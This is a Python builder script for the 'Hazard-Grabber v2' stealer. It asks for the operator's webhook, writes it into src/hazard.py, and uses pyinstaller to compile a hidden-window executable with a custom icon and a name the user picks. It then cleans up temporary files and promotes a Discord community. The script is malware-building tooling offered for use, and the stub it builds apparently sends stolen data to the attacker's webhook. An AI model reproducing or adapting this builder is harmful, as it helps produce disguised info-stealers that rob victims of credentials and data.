import time
import os
import sys
import requests
import shutil

from win10toast import ToastNotifier

os.system('title Hazard-Grabber Builder')
os.system("color b")
os.system("cls")
print("Installing requirements...")
time.sleep(1.5)
os.system("pip install -r requirements.txt")
os.system("cls")
os.system("color b")

webhook = input("What is your webhook? ")

search_text = "YOUR_WEBHOOK_HERE"
replace_text = webhook

try:
    with open(r'src/hazard.py', 'r') as file:
  
        data = file.read()
  
        data = data.replace(search_text, replace_text)
  
    with open(r'src/hazard.py', 'w') as file:
  
        file.write(data)
    print("Successfully wrote your webhook to the src. Make sure again you entered a correct one!")
    time.sleep(0.5)
    print(f"This is the webhook you entered: {webhook}")
except:
    print("Failed to write your webhook to the src. Make sure the code is correct and has not been changed.")
    time.sleep(0.5)
    print(f"This is the webhook you entered: {webhook}")
    
name = input("What should be the name of the file that is being created? ")
print("That sounds cool!")
time.sleep(1.5)
        
print("Starting to build your stub in 3 seconds...")
time.sleep(3.0)
print("File compilation started well.")
time.sleep(0.5)
print("Press CTRL + C to cancel, may break the application for future builds.")
time.sleep(1.0)
     
os.system(f"pyinstaller --onefile --noconsole -n {name} -i build/exe.ico src/hazard.py")
os.system("cls")
    
os.system("color b")
    
directory = os.getcwd()
toast = ToastNotifier()
    
toast.show_toast(
    "Hazard-Grabber-v2",
    "Your stub has been built!",
    duration = 25,
    icon_path = directory+"/build/hazard.ico",
    threaded = True,
)

path = directory+"/build/"+name
path2 = directory+f"{name}.spec"

try: 
    shutil.rmtree(f"{directory}/build/{name}")
    os.remove(f"{name}.spec")
    print(f"Successfully cleaned the folder and removed non-required temporary files. ({path}, {path2})")
except:
    print(f"Couldn't delete temporary files. They have probably already been deleted.")

time.sleep(1.0)

try:
    with open(r'src/hazard.py', 'r') as file:
  
        data = file.read()
  
        data = data.replace(replace_text, search_text)
  
    with open(r'src/hazard.py', 'w') as file:
  
        file.write(data)
    print("Successfully removed your webhook from the src for future builds.")
    time.sleep(0.5)
except:
    print("Failed to remove your webhook from the src. Make sure the code is correct and has not been changed.")
    time.sleep(0.5)

try:
    shutil.move(f"{directory}/dist/{name}.exe", f"{directory}")
    print(f"Moved {name}.exe to main directory successfully.")
    shutil.rmtree(f"{directory}/dist")
except:
    print(f"Couldn't move {name}.exe to main directory. Maybe is has been deleted or wasn't built correctly. I would still recommend you to check the dist directory for {name}.exe")

time.sleep(1.0)

print(f"Done. Check the current working directory for a {name}.exe!")
time.sleep(0.5)
print("I would appreciate a star on GitHub and some feedback really much!")
time.sleep(0.5)
print("You may also like to contribute in our community. https://discord.gg/gqms5tajzr")
time.sleep(0.5)
print("Closing in 10 seconds...")
time.sleep(10)
sys.exit